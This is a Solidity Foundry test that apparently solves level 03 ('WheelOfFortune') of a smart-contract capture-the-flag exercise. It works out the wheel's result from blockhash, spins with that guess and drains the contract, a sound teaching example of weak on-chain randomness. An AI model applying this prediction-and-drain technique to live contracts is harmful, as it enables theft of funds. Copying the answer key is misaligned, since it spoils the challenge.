// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/03_WheelOfFortune/WheelOfFortune.sol";

// forge test --match-contract WheelOfFortuneTest -vvvv
contract WheelOfFortuneTest is BaseTest {
    WheelOfFortune instance;

    function setUp() public override {
        super.setUp();
        instance = new WheelOfFortune{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */
        uint256 blockNumber = block.number;
        uint256 hashVal = uint256(blockhash(blockNumber));
        uint256 result = uint256(keccak256(abi.encode(hashVal))) % 100;

        instance.spin{value: 0.01 ether}(result);
        instance.spin{value: 0.01 ether}(1);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
